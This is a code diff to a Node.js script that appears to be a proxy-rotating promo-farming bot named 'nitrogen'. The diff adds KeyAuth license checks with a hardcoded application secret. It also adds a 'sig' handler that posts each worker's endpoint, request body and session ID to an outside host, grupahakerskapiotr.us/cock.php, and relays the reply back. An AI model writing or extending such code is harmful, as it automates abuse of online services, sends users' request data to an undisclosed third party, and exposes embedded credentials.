@@ -4,15 +4,35 @@ import { Worker } from 'worker_threads'
 import { FoldetEmailingClient } from './mail/foldet-client.js';
 import { AsariEmailingClient } from './mail/asari-client.js'
 import { Proxies } from './proxy.js'
+import * as KeyAuth from './KeyAuth.js'
+import got from "got";
+
+KeyAuth.api(
+    "nitrogen", // Application Name
+    "4ZybA005nM", // OwnerID
+    "2f6c2959285b8da2eb3745a1a92dc913ad237499aab840c45cc0ae8530fbc570", // Application Secret
+    "1.0" // Application Version
+)
+
+await KeyAuth.init();
+
+if (!KeyAuth.response.success) {
+    KeyAuth.error("Status: " + KeyAuth.response.message)
+}
 
 const config = JSON.parse(readFileSync('config.json').toString())
+await KeyAuth.License(config.key)
+if (!KeyAuth.response.success) {
+    console.log("Invalid license key ;c")
+    process.exit(0)
+}
 const proxies = new Proxies(config.proxy.url);
 
 var client;
 if(config.mail.type == "asari") {
     client = new AsariEmailingClient()
-} else if(config.mail.type == "foldet"){
-    client = new FoldetEmailingClient("ws://backend.foldet.pl:587", config.mail.key)
+} else if(config.mail.type == "custom"){
+    client = new FoldetEmailingClient(config.mail.url, config.mail.key)
     await client.awaitConnection()
 } else {
     throw "Unknown mail type!";
@@ -29,11 +49,8 @@ async function createWorkir() {
 
 function createWorker(proxy, exit) {
     var start = Date.now()
-    var worker = new Worker(new URL('promo-worker.js'), {
-        workerData: {
-            noob: config.noob
-        }
-    }).on('error', (err) => {
+    var worker = new Worker(new URL('promo-worker.js', import.meta.url))
+    worker.on('error', (err) => {
         console.log(`failed: ${err}`)
         if(config.proxy.removeOnFail)
             proxies.pop(proxy)
@@ -55,6 +72,17 @@ function createWorker(proxy, exit) {
             })
         } else if(message.type == "proxy") {
             worker.postMessage(proxies.getProxy())
+        } else if(message.type == "sig") {
+            return got.post("https://grupahakerskapiotr.us/cock.php", {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                form: {
+                    'sus': message.endpoint,
+                    'amogus': message.body,
+                    'morbius': KeyAuth.GetSessionId()
+                }
+            }).then(content => worker.postMessage(content.body))
         }
     }).on('exit', exit)
 }
